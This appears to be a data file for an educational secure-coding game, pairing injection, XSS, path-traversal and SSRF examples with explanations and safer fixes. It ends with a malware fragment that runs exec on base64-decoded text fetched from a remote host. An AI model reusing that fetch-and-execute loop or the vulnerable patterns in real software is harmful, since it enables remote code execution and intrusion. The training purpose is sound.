meta.name: Code Invaders Trend Pack
notes: Examples use placeholder domains like payload.invalid, c2.invalid, and exfil.invalid.
These are intentionally obvious for educational gameplay rather than fully realistic production code.
Focus areas were chosen from recent OWASP, MITRE CWE, CISA, and MITRE ATT&CK guidance.
Each insecure and malware snippet now includes snippet_id, vuln_key, classification, analysis_paragraph, and line_notes.
Malware snippets were rewritten to be intentionally obvious for training use, using placeholder .invalid domains and exaggerated combinations of remote hosts, dangerous execution, and obfuscation.
Filtered to only JavaScript, TypeScript, and Python examples

insecure.snippet: const sql = "SELECT * FROM users WHERE id=" + req.query.id
insecure.look_for: string-built query; user input inside SQL
insecure.player_skill: Spot input being merged into query logic instead of passed as data.
insecure.analysis_paragraph: SQL / NoSQL Injection: User-controlled input is concatenated directly into a database query or filter, so the database treats attacker input as query logic instead of plain data. In this snippet, the risky cue is that the code string-built sql, which makes the behavior easy for players to spot.

line_notes.code: const sql = "SELECT * FROM users WHERE id=" + req.query.id
line_notes.label: vulnerable_pattern
line_notes.why_it_is_good_or_bad: User-controlled input is concatenated directly into a database query or filter, so the database treats attacker input as query logic instead of plain data.

insecure.safer_contrast: Use a parameterized query, for example: db.query("SELECT * FROM users WHERE id = ?", [userId]).

insecure.player_skill: Recognize when user input is passed into a shell or system command.
insecure.analysis_paragraph: Command Injection: The code builds a shell command using attacker-controlled input, so metacharacters, separators, or flags can change what actually runs on the host. In this snippet, the risky cue is that the code exec/system with string concatenation, which makes the behavior easy for players to spot.

line_notes.label: vulnerable_pattern
line_notes.why_it_is_good_or_bad: The code builds a shell command using attacker-controlled input, so metacharacters, separators, or flags can change what actually runs on the host. Uses a dangerous dynamic execution function, which means data can be turned into code and run.

insecure.safer_contrast: Use a safe process API with fixed arguments, for example: subprocess.run(["ping", host]).

insecure.player_skill: Spot when untrusted content is written into HTML or script-capable browser sinks.
insecure.analysis_paragraph: XSS / Content Injection: The application inserts user-controlled content into the DOM or HTML without escaping or sanitization, allowing attacker markup or script to run in the browser. In this snippet, the risky cue is that the code innerhtml, which makes the behavior easy for players to spot.

line_notes.label: vulnerable_pattern
line_notes.why_it_is_good_or_bad: The application inserts user-controlled content into the DOM or HTML without escaping or sanitization, allowing attacker markup or script to run in the browser.

insecure.safer_contrast: Render text safely, for example: element.textContent = userInput.

insecure.category: File Handling: Path Traversal / Unsafe Upload
insecure.player_skill: Recognize when user input controls a path, filename, include target, or extraction location.
insecure.analysis_paragraph: Path Traversal / Unsafe Upload: The code lets attacker input influence file paths or upload destinations, so a crafted path can escape the intended directory or overwrite sensitive files. In this snippet, the risky cue is that the code base path + user input, which makes the behavior easy for players to spot.

line_notes.label: vulnerable_pattern
line_notes.why_it_is_good_or_bad: The code lets attacker input influence file paths or upload destinations, so a crafted path can escape the intended directory or overwrite sensitive files.

insecure.safer_contrast: Normalize the path and enforce an allowlisted base directory before opening files.

insecure.player_skill: Spot when the server fetches a URL, host, or callback provided by the user.
insecure.analysis_paragraph: SSRF / Untrusted URL Fetch: The application makes outbound network requests to attacker-chosen destinations, which can expose internal services, metadata endpoints, or trusted network access. In this snippet, the risky cue is that the code fetch(userurl), which makes the behavior easy for players to spot.

line_notes.label: vulnerable_pattern
line_notes.why_it_is_good_or_bad: The application makes outbound network requests to attacker-chosen destinations, which can expose internal services, metadata endpoints, or trusted network access. Downloads remote content or sends data over the network.

insecure.safer_contrast: Allowlist destination hosts and reject arbitrary user-supplied URLs.

import base64,requests,time,os,socket

    exec(base64.b64decode(r.text).decode())
    time.sleep(30)
